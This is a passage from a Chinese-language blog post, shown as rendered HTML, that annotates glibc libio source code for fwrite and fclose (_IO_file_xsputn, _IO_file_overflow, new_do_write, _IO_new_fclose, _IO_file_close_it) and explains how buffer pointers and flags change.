class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>

<p>从该函数返回_IO_file_xsgetn后，将在下次循环中被拷贝。</p>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>也具有相同的命名规则，调用过程为: fwrite-&gt;_IO_sputn-&gt;_IO_file_xsputn</p>
<h3 id="IO-file-xsputn"><a href="#IO-file-xsputn" class="headerlink" title="_IO_file_xsputn"></a>_IO_file_xsputn</h3><p>参数:</p>
<ul>
<li>f: 文件流指针</li>
<li>data: 缓冲区数据地址</li>
<li>n: 输出长度</li>
</ul>
<p>位于/libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 输出长度不合法直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="comment">// 检查是否有 _IO_LINE_BUF 和 _IO_CURRENTLY_PUTTING 标志</span></span><br><span class="line">  <span class="comment">// 表示只需要输出一行或立即输出</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取内容长度的同时，判断缓冲区中内容是否满足输出长度</span></span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; ) <span class="comment">// 找到&#x27;\n&#x27;</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) <span class="comment">// 否则仅获取长度</span></span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="comment">// 判断缓冲区是否为空</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 比较count与待输出长度，最后令count&lt;=to_do，并设置缓冲区指针</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 根据to_do和must_flush来输出内容，主要调用的是 _IO_OVERFLOW 与 new_do_write 来输出至缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="comment">// 调用_IO_file_overflow写入缓冲区中的数据，并且第二个参数是</span></span><br><span class="line">      <span class="comment">// EOF，将会写入缓冲区中所有内容</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      <span class="comment">// 根据写入数据长度超出缓冲区的长度，得到需要直接写入文件的数据长度和</span></span><br><span class="line">      <span class="comment">// 需要写入缓冲区的数据长度</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 直接写入文件，长度为do_write</span></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">	  <span class="comment">// 剩余部分写入缓冲区，长度为to_do</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>

<h4 id="IO-file-overflow"><a href="#IO-file-overflow" class="headerlink" title="_IO_file_overflow"></a>_IO_file_overflow</h4><p>该函数的就是用于当输出缓冲区满了的时候，继续写会溢出，所以要flush输出缓冲区</p>
<p>函数的定义位于 /libio/fileops.c。</p>
<p>参数:</p>
<ul>
<li>f: 文件流指针</li>
<li>ch: 输出长度</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 检查_IO_NO_WRITES标志位</span></span><br><span class="line">  <span class="comment">// _IO_NO_WRITES表示不可write数据</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="comment">// 检查_IO_CURRENTLY_PUTTING标志位和write缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>) <span class="comment">// 初始化</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base); <span class="comment">// 设置write缓冲区指针</span></span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="comment">// 检查_IO_IN_BACKUP标志，并修改缓冲区指针</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 修改_flags</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 检查第二个参数是否为EOF，是则直接读出所有内容</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="comment">// 检查缓冲区ptr指针是否指向end，是则调用_IO_do_flush，若仍得到EOF，则</span></span><br><span class="line">  <span class="comment">// 说明没有输出，返回EOF。</span></span><br><span class="line">  <span class="comment">// _IO_do_flush</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="comment">// 检查_IO_UNBUFFERED和_IO_LINE_BUF标志位，还有第二个参数是否为&#x27;\n&#x27;，满足则</span></span><br><span class="line">  <span class="comment">// 调用_IO_do_write读出数据。</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<h4 id="IO-do-write"><a href="#IO-do-write" class="headerlink" title="_IO_do_write"></a>_IO_do_write</h4><p>参数:</p>
<ul>
<li>fp: 文件流指针</li>
<li>data: 数据指针</li>
<li>to_do: 待输出长度</li>
</ul>
<p>主要调用的是 new_do_write，函数位于 /libio/fileops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 若缓冲区是新创建的，则to_do为0则不会执行new_do_write</span></span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure>

<h5 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="comment">// 检查_IO_IS_APPENDING标志()</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">// 若read和write缓冲区指针不满足下面这个条件，则会执行_IO_SYSSEEK</span></span><br><span class="line">  <span class="comment">// _IO_SYSSEEK将去寻找文件偏移，_offset是写入位置相对于文件0字节处的偏移</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用_IO_SYSWRITE写入数据</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="comment">// 根据写入数据长度调用修改文件流的当前列数</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 设置write缓冲区指针</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h4><p>这个函数会把数据拷贝到缓冲区，然后在缓冲区满的时候flush缓冲区，直到把全部数据拷贝到缓冲区</p>
<p>位于/libio/genops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="comment">// 检查写入长度是否合法</span></span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 写入数据</span></span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="comment">// 通过count记数缓冲区剩余字节，根据count的大小来决定写入的方式</span></span><br><span class="line">	  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="comment">// 若缓冲区剩余长度大于待写入长度，则重新赋值count，接下来一次拷贝完成写入</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="comment">// 若待写入长度大于20则使用memcpy完成大量数据拷贝</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="comment">// 否则使用循环每个字节单独拷贝</span></span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      _IO_ssize_t i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">// 直到所有数据写入缓冲区，或者调用overflow写入文件然后清空缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="keyword">unsigned</span> <span class="keyword">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure>

<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>命名规则同以上函数</p>
<h3 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h3><p>位于 /libio/iofclose.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="comment">// 检查_IO_IS_FILEBUF标志，有则调用_IO_un_link</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="comment">// 检查_IO_IS_FILEBUF标志，并设置文件流其他属性</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    <span class="comment">// _IO_file_close_it用来调用_IO_do_flush函数来刷新输出缓冲区并</span></span><br><span class="line">    <span class="comment">// 重新设置了缓冲区指针</span></span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">// 调用vtable中的_IO_default_finish</span></span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">	 the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">	_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 最后判断文件流是否是默认打开的三个输入输出流，不是则会设置_flags并</span></span><br><span class="line">  <span class="comment">// 释放文件流的内存</span></span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h4><p>位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> write_status;</span><br><span class="line">  <span class="comment">// 检查文件流的_fileno标志</span></span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查_IO_NO_WRITES和_IO_CURRENTLY_PUTTING标志</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    <span class="comment">// _IO_do_flush调用了_IO_do_write函数，即将缓冲区中的数据写入文件，</span></span><br><span class="line">    <span class="comment">// 并重置缓冲区</span></span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用_IO_SYSCLOSE关闭文件流</span></span><br><span class="line">  <span class="keyword">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">		      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line">  <span class="comment">// 接下来就是释放文件流包括缓冲区的内存</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">	_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure>

<h4 id="IO-default-finish"><a href="#IO-default-finish" class="headerlink" title="_IO_default_finish"></a>_IO_default_finish</h4><p>释放缓冲区</p>
<p>位于/libio/genops.c</p>
